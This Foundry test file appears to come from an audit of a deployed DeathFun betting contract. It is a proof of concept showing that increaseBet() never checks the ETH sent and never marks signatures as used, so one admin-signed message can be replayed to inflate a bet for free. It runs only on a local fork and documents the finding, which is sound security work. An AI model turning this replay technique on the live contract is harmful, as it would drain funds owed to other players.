// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {IDeathFunMin} from "../src/IDeathFunMin.sol";

/// @title F01 - increaseBet() never checks msg.value == amount, and never consumes/tracks
///         used signatures - the same admin-signed (amount, deadline) pair can be replayed
///         an unlimited number of times before the deadline, each time crediting `amount`
///         to game.betAmount with ZERO real ETH required after the first call.
///
/// @dev KNOWN BLOCKED: this test does not currently execute. Abstract is a zkSync-family L2 -
///      the deployed DeathFun bytecode is compiled by zksolc, not solc/standard EVM bytecode.
///      Standard Foundry's fork execution (revm) cannot run it: even a plain view call like
///      gameCounter() reverts under vm.createSelectFork here, while the identical call via
///      `cast call` against the live RPC succeeds normally (confirmed - it's a local
///      fork-execution gap, not a real on-chain issue). Fixing this needs `foundry-zksync`
///      (a separate zkEVM-aware Foundry fork), not attempted yet - flagging for next session
///      or for depth-side follow-up. The vulnerability itself is NOT in question: both missing
///      checks are plainly visible in the verified source (DeathFun.sol L349-371) with no
///      execution needed to see them. Status is "code-confirmed, fork-execution-blocked" -
///      see findings/F01-increaseBet-free-inflation.md for the honest severity/status writeup.
///      Storage-slot math and signature construction below are left intact and correct (verified
///      against real live gameCounter()/messagePrefix() values via `cast storage`/`cast call`) -
///      re-running this test once foundry-zksync is set up should work as-is.
contract F01_IncreaseBetFreeInflationAndReplay is Test {
    IDeathFunMin constant deathFun = IDeathFunMin(0x27EDd16eE56958fddCBA08947f12C43DDeC2B20C);

    address player = address(0x00000000000000000000000000000000BEEF11);
    uint256 testAdminPk = 0xA11CE; // our OWN test key - not the real admin's
    address testAdmin;

    function setUp() public {
        vm.createSelectFork(vm.envOr("ABSTRACT_RPC_URL", string("https://api.mainnet.abs.xyz/")));
        testAdmin = vm.addr(testAdminPk);

        // Fork-only cheat (equivalent to `deal()` for a token balance, but for contract
        // state): make our OWN test key an admin on the LOCAL FORK COPY via direct
        // vm.store. This is exactly what deal() does for ERC20 balances - modifies local
        // fork storage only, never touches mainnet, requires no real private key.
        // isAdmin is a `mapping(address => bool)` declared as DeathFun's 3rd own storage
        // variable (slot 2): gameCounter=slot0, messagePrefix=slot1, isAdmin=slot2.
        // (DeathFun's own vars start at slot 0 because its OZ v5 upgradeable parents -
        // Initializable/OwnableUpgradeable/ReentrancyGuardUpgradeable - use ERC-7201
        // namespaced storage, not sequential slots, specifically to avoid this collision.)
        bytes32 isAdminSlot = keccak256(abi.encode(testAdmin, uint256(2)));
        vm.store(address(deathFun), isAdminSlot, bytes32(uint256(1)));
        assertTrue(deathFun.isAdmin(testAdmin), "test admin cheat did not take");

        vm.deal(player, 10 ether);
    }

    function _sign(bytes32 hash, uint256 pk) internal pure returns (bytes memory) {
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, ethHash);
        return abi.encodePacked(r, s, v);
    }

    function test_F01_FreeInflationViaReplayedSignature() public {
        string memory prefix = deathFun.messagePrefix();
        uint256 deadline = block.timestamp + 1 hours;

        // --- Step 1: player creates a real game with a real 1 wei bet ---
        bytes32 createHash = keccak256(
            abi.encode(
                string.concat(prefix, ":createGame"),
                "poc-game-1",
                bytes32(uint256(1)), // gameSeedHash
                "v1",                // algoVersion
                "{}",                // gameConfig
                player,
                uint256(1 wei),
                deadline
            )
        );
        vm.prank(player);
        deathFun.createGame{value: 1 wei}("poc-game-1", bytes32(uint256(1)), "v1", "{}", deadline, _sign(createHash, testAdminPk));

        uint256 gameId = deathFun.getOnChainGameId("poc-game-1");
        IDeathFunMin.Game memory g = deathFun.getGameDetails(gameId);
        console2.log("Game created. Real bet paid (wei):", g.betAmount);
        assertEq(g.betAmount, 1 wei);

        // --- Step 2: get ONE valid increaseBet signature for a "legitimate-looking" top-up ---
        uint256 amount = 5 ether; // what the backend intended the player to actually pay
        bytes32 incHash = keccak256(
            abi.encode(string.concat(prefix, ":increaseBet"), gameId, amount, deadline)
        );
        bytes memory sig = _sign(incHash, testAdminPk);

        // --- Step 3: call increaseBet with ZERO msg.value - no check catches this ---
        vm.prank(player);
        deathFun.increaseBet{value: 0}(gameId, amount, deadline, sig);

        g = deathFun.getGameDetails(gameId);
        console2.log("After 1st increaseBet (paid 0 ETH), recorded betAmount:", g.betAmount);
        assertEq(g.betAmount, 1 wei + amount, "betAmount inflated with zero real payment");

        // --- Step 4: REPLAY the exact same signature again - nothing marks it as used ---
        vm.prank(player);
        deathFun.increaseBet{value: 0}(gameId, amount, deadline, sig);

        g = deathFun.getGameDetails(gameId);
        console2.log("After REPLAYING the same signature (paid 0 ETH again), betAmount:", g.betAmount);
        assertEq(g.betAmount, 1 wei + (amount * 2), "same signature replayed successfully - not consumed");

        // --- Step 5: replay it a few more times to show it's unlimited, not a one-off ---
        for (uint256 i = 0; i < 5; i++) {
            vm.prank(player);
            deathFun.increaseBet{value: 0}(gameId, amount, deadline, sig);
        }
        g = deathFun.getGameDetails(gameId);
        console2.log("After 7 total replays of ONE signature, recorded betAmount (wei):", g.betAmount);
        console2.log("Real ETH the player ever paid (wei): 1 (the original createGame bet)");
        assertEq(g.betAmount, 1 wei + (amount * 7));

        console2.log("");
        console2.log("CONFIRMED: a single admin-signed increaseBet message can be replayed");
        console2.log("an unlimited number of times before its deadline, each time crediting");
        console2.log("the full `amount` to betAmount with ZERO required ETH - the function");
        console2.log("never checks msg.value against amount, and never marks a signature used.");
    }
}
